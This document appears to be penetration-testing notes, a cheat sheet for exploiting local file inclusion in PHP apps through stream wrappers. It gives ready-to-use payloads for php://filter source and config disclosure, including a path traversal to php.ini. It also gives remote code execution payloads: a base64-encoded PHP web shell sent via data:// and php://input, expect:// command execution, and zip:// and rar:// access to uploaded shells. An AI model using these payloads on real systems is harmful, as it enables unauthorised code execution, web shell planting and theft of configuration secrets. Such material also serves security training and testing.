PHP Filters are a type of PHP wrapper, where we can pass different types of input and have it filtered by the filter we specify.

PHP Wrapper streams -- `php://`
PHP Filter Wrapper -- `php://filter/`

## File Disclosure
When enumerating web apps, sometimes you need to look at source code of PHP files but their execution prevents you -- PHP Filter Wrappers let you read it.

Filter
```bash
# php://filter wrapper summarized
Attempt 1: Clear text
	index.php?file=php://filter/resource=<file> # NO EXTENSION

Attempt 2: Encoded   #sometimes this is necessary
	index.php?file=php://filter/convert.base64-encode/resource=<file> #NO EXTENSION

# Source Code Disclosure
php://filter/read=convert.base64-encode/resource=<config>#.php is auto-appended
	#replace config with config file, like index.php
```

## Remote Code Execution
For all of these, allow_url_include must be enabled in PHP config

Checking allow_url_include
```bash
/etc/php/X.Y/apache2/php.ini  # apache php config file standard location
/etc/php/X.Y/fpm/php.ini      # nginx php config file standard location

curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" # annotate base64 string

# Check allow_url_include value
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
	allow_url_include = On  # this is the desired output
```

#### Data Wrapper
Requires allow_url_include 
Sometimes you are able to achieve code execution by embedding data elements. 

data:// wrapper usage
```bash
# generate base64 php webshell
echo '<?php system($_GET["cmd"]); ?>' | base64 
	PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==

# URL encode the base64 string, then pass commands to web shell
index.php?page=data://text/plain,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id 
```

#### Input Wrapper
Requires allow_url_include 
Similar to Data wrapper usage but with POST request data

input:// wrapper usage
```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?page=php://input&cmd=<command goes here!!!>"
```

#### Expect Wrapper
Requires allow_url_include 
Finally, we may utilize the expect wrapper, which allows us to directly run commands through URL streams. 

expect:// wrapper usage
```bash
# grep for expect INSTEAD of allow_url_include
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
	extension=expect  # this is the desired output

# execute commands
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://<command>"
```

#### Accessing Inside Compressed Files (ZIP and RAR)
See [[LFI and File Uploads]] for methods for uploading and abusing archived files... slightly different from the technique below

Sometimes you may be able to upload files that automatically get compressed to zip or rar format. This wrapper allows you to access the php file within the zip file that you uploaded:
```bash
# zip wrapper summarized

index.php?page=zip://<path_to_zip_file>/<zip_file>.zip%23<shell> # NO EXTENSION


# rar wrapper summarized

index.php?page=rar://<path_to_rar_file>/<rar_file>.rar%23<shell> # NO EXTENSION
```

